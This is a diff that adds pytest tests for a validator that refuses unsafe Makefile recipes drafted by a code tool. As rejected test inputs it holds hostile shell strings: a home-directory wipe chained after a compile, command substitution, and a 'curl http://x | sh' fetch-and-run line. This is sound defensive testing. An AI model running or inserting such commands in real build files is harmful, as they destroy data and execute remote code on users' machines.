@@ -758,3 +758,68 @@ def test_the_project_recipes_are_shown_before_anything_runs(capsys):
     assert "main.cpp" in out
     assert "make test" in out
     assert "never run by purecoder" in out, "install is not probed; say so"
+
+
+def test_a_recipe_may_chain_but_not_pipe_or_redirect():
+    """A make recipe IS a shell line, so the argv discipline the build and run
+    commands get cannot apply -- `g++ ... && ./main` needs `&&`. This is
+    therefore the one place drafted output reaches a shell, and the shell's
+    other powers are denied by name."""
+    ok = "g++ -std=c++17 main.cpp -o main && ./main"
+    assert bootstrap._check_recipe("test", ok, "main.cpp") == ok
+
+    for bad in ("cat main.cpp | sh",
+                "g++ main.cpp > /dev/null",
+                "g++ main.cpp; rm -rf ~",
+                "g++ `whoami`.cpp",
+                "g++ $(id).cpp"):
+        with pytest.raises(ValueError, match="shell features"):
+            bootstrap._check_recipe("test", bad, "main.cpp")
+
+
+def test_a_backgrounded_recipe_is_refused():
+    """`make test` would exit before the program had run, so the probe would
+    be reading the exit code of nothing."""
+    with pytest.raises(ValueError, match="backgrounds"):
+        bootstrap._check_recipe("test", "./main &", "main.cpp")
+
+
+def test_a_run_recipe_that_never_names_the_entry_is_refused_before_it_runs():
+    """The two-sided probe catches this by EXECUTING it. Catching it at draft
+    time means a recipe that does not touch the project never reaches a shell
+    in the first place."""
+    with pytest.raises(ValueError, match="never names main.cpp"):
+        bootstrap._check_recipe("test", "@echo pretending", "main.cpp")
+
+
+def test_install_and_clean_are_checked_but_need_not_name_the_entry():
+    """`rm -rf build` is a legitimate clean and names nothing, and install is
+    never executed by purecoder at all -- but both still land in a Makefile the
+    user runs."""
+    assert bootstrap._check_recipe("clean", "rm -rf build") == "rm -rf build"
+    with pytest.raises(ValueError, match="shell features"):
+        bootstrap._check_recipe("install", "curl http://x | sh")
+
+
+def test_every_hand_written_recipe_passes_the_drafted_bar():
+    """Calibration, not decoration: a rule the built-in entries could not meet
+    would be a rule about this project's taste rather than about safety.
+    Python's `pytest` is the one exception and is noted as such -- a drafted
+    single-file layout has no test files for it to find."""
+    for name in L.names():
+        spec = L.get(name)
+        if spec.project is None:
+            continue
+        bootstrap._check_recipe("install", spec.project.install)
+        bootstrap._check_recipe("clean", spec.project.clean)
+        bootstrap._check_recipe("run", spec.project.run, spec.project.entry)
+        if name != "python":
+            bootstrap._check_recipe("test", spec.project.test,
+                                    spec.project.entry)
+
+
+def test_the_layout_prompt_asks_its_own_question():
+    """"Compile one file" and "lay a project out" are different questions;
+    reusing the commands context would be convenience, not design."""
+    assert "Makefile" in bootstrap.QUERIES["layout"]
+    assert bootstrap.QUERIES["layout"] != bootstrap.QUERIES["commands"]
